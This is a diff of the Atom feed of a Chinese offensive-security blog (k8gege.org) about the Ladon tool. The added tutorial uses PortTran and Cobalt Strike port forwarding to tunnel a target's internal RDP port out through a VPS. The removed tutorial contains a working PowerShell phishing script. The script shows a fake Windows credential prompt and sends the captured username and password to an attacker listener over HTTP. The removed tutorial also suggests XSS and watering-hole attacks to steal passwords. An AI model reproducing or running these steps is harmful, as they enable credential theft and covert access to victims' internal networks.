@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://k8gege.org/"/>
-  <updated>2021-01-05T12:03:42.371Z</updated>
+  <updated>2021-01-05T12:48:43.061Z</updated>
   <id>http://k8gege.org/</id>
   
   <author>
@@ -15,6 +15,42 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>〖教程〗Ladon &amp; Cobalt Strike PortTran端口转发/内网穿透</title>
+    <link href="http://k8gege.org/p/porttran.html"/>
+    <id>http://k8gege.org/p/porttran.html</id>
+    <published>2021-01-04T16:10:00.000Z</published>
+    <updated>2021-01-05T12:48:43.061Z</updated>
+    
+    <content type="html"><![CDATA[<p style="color:#fff;"> <% <span class="archive-article-date">Visit <span id="busuanzi_value_page_pv"></span>%></%></p><h3 id="PortTran"><a href="#PortTran" class="headerlink" title="PortTran"></a>PortTran</h3><p>.NET端口转发工具,支持任意权限。<br><a href="https://github.com/k8gege/PortTran" target="_blank" rel="noopener">https://github.com/k8gege/PortTran</a></p><h3 id="外网VPS监听"><a href="#外网VPS监听" class="headerlink" title="外网VPS监听"></a>外网VPS监听</h3><p>PortTranS.exe 8000 338<br><img data-original="https://github.com/k8gege/PortTran/blob/master/img/vps.PNG"></p><h3 id="目标内网转发"><a href="#目标内网转发" class="headerlink" title="目标内网转发"></a>目标内网转发</h3><p>PortTranC.exe 192.168.85.169 3389 192.168.85.142 8000<br><img data-original="https://github.com/k8gege/PortTran/blob/master/img/target.PNG"></p><h3 id="VPS连接3389"><a href="#VPS连接3389" class="headerlink" title="VPS连接3389"></a>VPS连接3389</h3><p>mstsc /console /v:127.0.0.1:338<br><img data-original="https://github.com/k8gege/PortTran/blob/master/img/3389.PNG"></p><h3 id="自己连接3389"><a href="#自己连接3389" class="headerlink" title="自己连接3389"></a>自己连接3389</h3><p>反向转发到VPS后，我们自己的机器连接VPS监听端口即为目标对应端口，如访问VPS的338端口对应1.30的3389端口</p><p>如：mstsc /console /v:这里填写VPS的IP即可:338</p><h3 id="Ladon命令"><a href="#Ladon命令" class="headerlink" title="Ladon命令"></a>Ladon命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Usage:</span><br><span class="line">Ladon PortTran TranPort ConnPort</span><br><span class="line">Ladon PortTran TragetIP TargetPort VpsIP TranPort</span><br><span class="line">Example:</span><br><span class="line">Listen: Ladon PortTran 8000 338</span><br><span class="line">Tran: Ladon PortTran 192.168.1.30 3389 192.168.1.8 8000</span><br><span class="line">Test: mstsc 192.168.1.8 338</span><br></pre></td></tr></table></figure><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/PortTran.PNG"></p><h3 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h3><p>转发到本机<br>rportfwd 389 192.1.20.30 3389<br>转发到VPS<br>Ladon PortTran 192.168.1.30 3389 192.168.1.8 8000</p><h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>7.8版本：K8小密圈</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p style=&quot;color:#fff;&quot;&gt; 
+&lt;% &lt;span class=&quot;archive-article-date&quot;&gt;
+Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
+
+%&gt;
+&lt;/%&gt;&lt;/p&gt;
+
+
+&lt;h3 id=&quot;PortT
+      
+    
+    </summary>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+      <category term="porttran" scheme="http://k8gege.org/tags/porttran/"/>
+    
+  </entry>
   
   <entry>
     <title>〖教程〗Ladon检测100种网络摄像头默认密码列表</title>
@@ -554,34 +590,6 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
       <category term="IIS" scheme="http://k8gege.org/tags/IIS/"/>
     
       <category term="EXP" scheme="http://k8gege.org/tags/EXP/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>〖教程〗使用Ladon捕获Windonws登陆密码</title>
-    <link href="http://k8gege.org/p/GetWinAuth.html"/>
-    <id>http://k8gege.org/p/GetWinAuth.html</id>
-    <published>2020-08-11T12:10:00.000Z</published>
-    <updated>2020-08-15T12:22:21.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/GetWinAuth.html";</script><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>&gt;= Ladon 6.6.3<br>Update: 20200618</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>使用PowerShell模仿Windowns登陆认证获取管理员密码，Ladon监听捕获基础认证密码。</p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>域控或管理员密码获取，当前权限很低又无法提权时。（有权限直接读明文或HASH）</p><h3 id="Ladon监听"><a href="#Ladon监听" class="headerlink" title="Ladon监听"></a>Ladon监听</h3><p>该功能模仿了MSF里的基础认证监听模块，但最大的优势在于无需占用系统大量空间和内存。<br>可直接部署在目标内网或VPS上，也无需复杂命令，直接输以下命令一键监听自动捕获密码。<br>其它用途：<a href="http://k8gege.org/Ladon/webser.html">http://k8gege.org/Ladon/webser.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon Web 800</span><br></pre></td></tr></table></figure><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/AuthPass.PNG"></p><h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><p>执行以下脚本代码，会弹出十分逼真的基础认证登陆窗口，自动获取用户名和域来提高真实性。<br>当然也可以使用其它脚本或语言，如JS水坑攻击、XSS截取各种WEB邮箱密码等等多种钩鱼姿势。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cred</span> = <span class="variable">$host</span>.ui.promptforcredential(<span class="string">'Failed Authentication'</span>,<span class="string">''</span>,[<span class="type">Environment</span>]::UserDomainName + <span class="string">"\"</span> + [<span class="type">Environment</span>]::UserName,[<span class="type">Environment</span>]::UserDomainName);</span><br><span class="line">[<span class="type">System.Net.ServicePointManager</span>]::ServerCertificateValidationCallback = &#123;<span class="variable">$true</span>&#125;;</span><br><span class="line"><span class="built_in">Add-Type</span> <span class="string">@'</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">public class Authorization</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">public static void submit(string usr,string pwd)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">string url = "http://192.168.1.110:8000/";</span></span><br><span class="line"><span class="string">System.Net.HttpWebRequest myReq = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(url);</span></span><br><span class="line"><span class="string">string username = usr;</span></span><br><span class="line"><span class="string">string password = pwd;</span></span><br><span class="line"><span class="string">string usernamePassword = username + ":" + password;</span></span><br><span class="line"><span class="string">System.Net.CredentialCache mycache = new System.Net.CredentialCache();</span></span><br><span class="line"><span class="string">mycache.Add(new Uri(url), "Basic", new System.Net.NetworkCredential(username, password));</span></span><br><span class="line"><span class="string">myReq.Credentials = mycache;</span></span><br><span class="line"><span class="string">myReq.Headers.Add("Authorization", "Basic " + Convert.ToBase64String(new System.Text.ASCIIEncoding().GetBytes(usernamePassword)));</span></span><br><span class="line"><span class="string">System.Net.WebResponse wr = myReq.GetResponse();</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string">'@</span></span><br><span class="line">[<span class="type">Authorization</span>]::submit(<span class="variable">$cred</span>.username, <span class="variable">$cred</span>.getnetworkcredential().password)</span><br></pre></td></tr></table></figure><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg"></div>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;=============================================================================================&lt;br&gt;++++++++++++++++++++++++++++++++++++++++
-      
-    
-    </summary>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
-      <category term="Pass" scheme="http://k8gege.org/tags/Pass/"/>
     
   </entry>
   
